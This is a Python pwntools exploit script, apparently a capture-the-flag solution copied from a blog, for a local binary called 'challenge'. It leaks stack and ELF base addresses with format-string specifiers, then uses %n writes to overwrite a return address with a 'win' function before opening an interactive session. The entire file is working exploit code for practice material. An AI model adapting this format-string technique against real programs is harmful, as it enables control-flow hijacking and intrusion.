"""
from https://mineta.tistory.com/73
"""

from pwn import *
import sys
 
p = process('./challenge')
 
def exploit() :
    payload = 'A'*0x19
    payload += '%10$p'
 
    p.writeafter('Name: ', payload)
    p.writelineafter('> ', '2')
    p.readuntil('0x')
    stack_vuln_ret = int(p.read(8), 16)-0xC
 
    print('[Exploit] RET of vuln: '+hex(stack_vuln_ret))
 
    payload = 'A'*0x19
    payload += '%11$p'
 
    p.writelineafter('> ', '1')
    p.writeafter('Name: ', payload)
    p.writelineafter('> ', '2')
    p.readuntil('0x')
    elf_base = int(p.read(8), 16)-0xA77
    win = elf_base+0x9FD
    cmd = elf_base+0x2040
    temp = elf_base+0x2100
 
    print('[Exploit] ELF base address: '+hex(elf_base))
    print('[Exploit] win = '+hex(win))
    print('[Exploit] cmd = '+hex(cmd))
    print('[Exploit] writable address: '+hex(temp)+' (temporary)')
 
    payload = 'A'*0x19
    payload += 'AA%6$n'
 
    p.writelineafter('> ', str((temp & 0xFFFFFF00) | 1))
    p.writeafter('Name: ', payload)
    p.writelineafter('> ', str((temp & 0xFFFFFF00) | 2))
 
    for i in range(10) :
        p.writelineafter('> ', str(cmd+0x20+6+i))
 
    loword = win & 0xFFFF
    hiword = (win >> 16) & 0xFFFF
 
    p.writelineafter('> ', str((temp & 0xFFFFFF00) | 1))
    p.write('%'+str(loword-12)+'c%6$n\x00')
    p.writelineafter('> ', str(stack_vuln_ret-2**32))
 
    p.writelineafter('> ', str((temp & 0xFFFFFF00) | 1))
    p.write('%'+str(hiword-12)+'c%6$n\x00')
    p.writelineafter('> ', str(stack_vuln_ret+2-2**32))
 
    p.writelineafter('> ', '0')
 
    p.interactive()
 
 
if __name__ == '__main__' :
    exploit()

